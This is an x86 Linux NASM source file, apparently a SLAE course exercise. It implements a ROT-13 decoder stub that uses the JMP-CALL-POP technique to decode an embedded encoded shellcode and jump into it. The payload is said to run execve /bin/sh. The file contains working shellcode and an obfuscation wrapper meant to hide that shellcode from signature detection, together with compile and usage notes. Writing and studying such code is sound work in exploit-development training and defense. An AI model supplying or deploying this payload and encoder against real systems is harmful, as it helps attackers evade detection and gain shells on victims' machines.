; Filename: rot13_decoder_stub_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux stub for decoding and executing a ROT-13 encoded 
; shellcode.
; Usage: ./rot13_decoder_stub_shellcode
; Compile with:
; ./compile.sh rot13_decoder_stub_shellcode
; Size of shellcode: 16 bytes(Stub)


global _start

section .text
_start:

    jmp short call_decoder     ; Using the JMP-CALL-POP technique - JMP section

    initiate_decoder:          ; Start the decoding of the shellcode - POP section
    pop esi                    ; Pop the shellcode which is in TOS into ESI register

    decoder_loop:              ; Actual decoding happens here in a loop
    sub byte [esi], 13         ; Get original shellcode by subtracting 13
    jz Shellcode               ; Break condition hits when we get 0 and transfer execution flow to decoded shellcode 
    inc esi                    ; Increment ESI to decode each and every byte
    jmp short decoder_loop     ; Run decoder_loop on every byte till we get 0 on subtracting

    call_decoder:              ; CALL section
    call initiate_decoder      ; Goto initiate_decoder function to put the shellcode onto the stack
    ; The encoded shellcode for execve /bin/sh is defined below, change if required.
    Shellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d,0x0d


    